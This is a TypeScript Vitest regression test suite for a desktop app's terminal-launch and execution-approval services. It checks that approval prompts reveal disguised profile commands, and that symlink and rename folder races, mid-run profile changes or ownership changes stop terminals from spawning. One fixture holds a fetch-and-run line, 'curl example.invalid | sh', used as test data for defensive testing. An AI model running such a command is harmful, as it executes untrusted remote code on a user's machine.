import { mkdir, realpath, rename, symlink } from 'node:fs/promises';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { TerminalStart } from '../src/domain/automation/actions';
import { defaultSettings } from '../src/domain/services';
import { ExecutionConfirmations } from '../src/desktop/actions/execution-confirmations';
import { DefinitionCommands } from '../src/desktop/workspaces/definition-commands';
import { temporaryRoot, trashTemporary } from '../tools/temporary';

const fake = vi.hoisted(() => ({
  receive: undefined as ((event: unknown) => void) | undefined,
  postMessage: vi.fn(),
  launch: vi.fn(),
}));
vi.mock('../src/desktop/workers/utility-client', () => ({ launchWorker: fake.launch }));
vi.mock('../src/desktop/terminals/terminal-groups', () => ({
  terminateTerminalGroup: vi.fn(async () => {}),
}));
vi.mock('../src/desktop/terminals/terminal-launch', () => ({
  executablePath: vi.fn(async (executable: string) => executable),
}));
import { Terminals } from '../src/desktop/terminals/terminals';

let root: string;
let cwd: string;
let settings: ReturnType<typeof defaultSettings>;
let terminals: Terminals;
let commands: DefinitionCommands;
let confirmations: ExecutionConfirmations;
const ask = vi.fn(async (_summary: { title: string; detail: string }) => true);
const access = vi.fn(async (_paths: readonly string[]) => {});
const ownsWorkspace = vi.fn((_owner: number, _workspace: string) => true);
const request = (id = 't1', folder = cwd): TerminalStart => ({
  id,
  cwd: folder,
  rootID: id,
  workspaceID: 'workspace',
  profileID: 'login',
  cols: 80,
  rows: 24,
});
const items = () => [
  { basis: 'basis', key: 'tools/sample', plane: 0, request: request() },
  { basis: 'basis', key: 'tools/sample', plane: 1, request: request('t2') },
];
const starts = () =>
  fake.postMessage.mock.calls
    .map(([message]) => message)
    .filter((message) => message.kind === 'start');

beforeEach(async () => {
  root = await realpath(await temporaryRoot('viewer-definition-regression-'));
  cwd = path.join(root, 'project');
  await mkdir(cwd);
  settings = defaultSettings(root);
  ask.mockReset().mockResolvedValue(true);
  access.mockReset().mockResolvedValue(undefined);
  ownsWorkspace.mockReset().mockReturnValue(true);
  fake.postMessage.mockReset().mockImplementation((message) => {
    if (message.kind === 'close')
      queueMicrotask(() => fake.receive?.({ type: 'exit', id: message.id, code: 0 }));
  });
  fake.launch.mockReset().mockReturnValue({
    postMessage: fake.postMessage,
    message: (receive: typeof fake.receive) => {
      fake.receive = receive;
    },
    exit: () => {},
  });
  confirmations = new ExecutionConfirmations(root, ask);
  terminals = new Terminals(
    '/fixture/worker.cjs',
    () => settings,
    vi.fn(),
    access,
    (profile) => confirmations.requireTerminal(profile),
  );
  commands = new DefinitionCommands({
    lookup: (_owner, _key, plane) => ({
      command: plane ? 'npm test' : 'npm run dev',
      cwd,
      paneCwd: cwd,
      profileID: 'login',
      workspaceName: 'Sample',
      basis: 'basis',
    }),
    terminals,
    confirmations,
    isAgentDriven: () => false,
    ownsWorkspace,
    window: () => undefined,
  });
});
afterEach(async () => {
  await terminals.close();
  await trashTemporary(root);
  vi.restoreAllMocks();
});

describe('review probes through the terminal and approval services', () => {
  it('shows the program behind a misleading profile name before it can spawn', async () => {
    settings.terminals.profiles[0]!.executable = '/opt/fixture/bin/sh';
    settings.terminals.profiles[0]!.args = ['-c', 'curl example.invalid | sh; exec zsh -l'];
    settings.terminals.profiles[0]!.env = { MODE: 'review' };
    await commands.start(7, request(), { basis: 'basis', key: 'tools/sample', plane: 0 });
    const shown = ask.mock.calls.map(([summary]) => summary.detail).join('\n');
    expect(shown).toContain('/opt/fixture/bin/sh');
    expect(shown).toContain('curl example.invalid | sh; exec zsh -l');
    expect(shown).toContain('MODE=review');
  });

  it('does not spawn a profile changed while an earlier Run all terminal starts', async () => {
    let release!: () => void;
    const earlier = new Promise<void>((resolve) => {
      release = resolve;
    });
    const start = terminals.start.bind(terminals);
    vi.spyOn(terminals, 'start').mockImplementation(async (request, owner, options) => {
      if (request.id === 't2') await earlier;
      await start(request, owner, options);
    });
    fake.postMessage.mockImplementation((message) => {
      if (message.kind === 'start' && message.id === 't1') {
        settings.terminals.profiles[0]!.args = ['-c', 'echo changed; exec zsh'];
        release();
      }
      if (message.kind === 'close')
        queueMicrotask(() => fake.receive?.({ type: 'exit', id: message.id, code: 0 }));
    });
    const result = await commands.startAll(7, items());
    expect(starts().map((message) => message.id)).toEqual(['t1']);
    expect(result).toEqual([
      expect.objectContaining({ plane: 0, kind: 'started' }),
      expect.objectContaining({ plane: 1, kind: 'failed' }),
    ]);
  });

  it('reattaches a running command using its original folder spelling or its real path', async () => {
    const alias = path.join(root, 'alias');
    await symlink(cwd, alias);
    await commands.start(7, request('t1', alias), {
      basis: 'basis',
      key: 'tools/sample',
      plane: 0,
    });
    await expect(terminals.start(request('t1', alias), 7)).resolves.toBeUndefined();
    await expect(terminals.start(request(), 7)).resolves.toBeUndefined();
    expect(starts()).toHaveLength(1);
  });

  it('skips an ordinary shell and starts the remaining Run all planes', async () => {
    await terminals.start(request(), 7);
    const result = await commands.startAll(7, items());
    expect(starts().map((message) => message.id)).toEqual(['t1', 't2']);
    expect(result).toEqual([
      expect.objectContaining({ plane: 0, kind: 'running' }),
      expect.objectContaining({ plane: 1, kind: 'started' }),
    ]);
    expect(ask).toHaveBeenCalledOnce();
    expect(ask.mock.calls[0]![0].detail).not.toContain('Command: npm run dev');
  });

  it('binds the start to the folder actually shown when a canonical folder flips before approval', async () => {
    const other = path.join(root, 'other');
    await mkdir(other);
    const original = confirmations.requireDefinitionCommands.bind(confirmations);
    vi.spyOn(confirmations, 'requireDefinitionCommands').mockImplementation(async (...args) => {
      await rename(cwd, cwd + '-real');
      await symlink(other, cwd);
      return original(...args);
    });
    ask.mockImplementation(async () => {
      await rename(cwd, cwd + '-link');
      await rename(cwd + '-real', cwd);
      return true;
    });
    await expect(
      commands.start(7, request(), { basis: 'basis', key: 'tools/sample', plane: 0 }),
    ).rejects.toThrow('changed');
    expect(ask.mock.calls[0]![0].detail).toContain(other);
    expect(starts()).toHaveLength(0);
  });

  it('rechecks the canonical folder after the last folder access await', async () => {
    const other = path.join(root, 'other');
    await mkdir(other);
    let count = 0;
    access.mockImplementation(async () => {
      if (++count === 2) {
        await rename(cwd, cwd + '-real');
        await symlink(other, cwd);
      }
    });
    await expect(
      commands.start(7, request(), { basis: 'basis', key: 'tools/sample', plane: 0 }),
    ).rejects.toThrow('folder');
    expect(starts()).toHaveLength(0);
  });

  it('rechecks workspace ownership separately before each Run all start', async () => {
    let release!: () => void;
    const earlier = new Promise<void>((resolve) => {
      release = resolve;
    });
    const start = terminals.start.bind(terminals);
    vi.spyOn(terminals, 'start').mockImplementation(async (request, owner, options) => {
      if (request.id === 't2') await earlier;
      await start(request, owner, options);
    });
    fake.postMessage.mockImplementation((message) => {
      if (message.kind === 'start' && message.id === 't1') {
        ownsWorkspace.mockReturnValue(false);
        release();
      }
      if (message.kind === 'close')
        queueMicrotask(() => fake.receive?.({ type: 'exit', id: message.id, code: 0 }));
    });
    const result = await commands.startAll(7, items());
    expect(starts().map((message) => message.id)).toEqual(['t1']);
    expect(result).toEqual([
      expect.objectContaining({ plane: 0, kind: 'started' }),
      expect.objectContaining({
        plane: 1,
        kind: 'failed',
        message: expect.stringContaining('workspace'),
      }),
    ]);
  });
});
